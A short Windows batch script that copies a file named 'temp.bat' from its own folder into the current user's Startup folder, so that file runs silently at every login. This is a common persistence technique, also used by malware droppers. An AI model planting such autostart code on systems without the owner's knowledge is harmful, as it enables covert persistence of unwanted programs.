@echo off

set "where=%~dp0"
set "desktop=%USERPROFILE%\Desktop"
set "filename=temp.bat"
set "here=C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

copy "%where%\%filename%" "%here%"

exit 0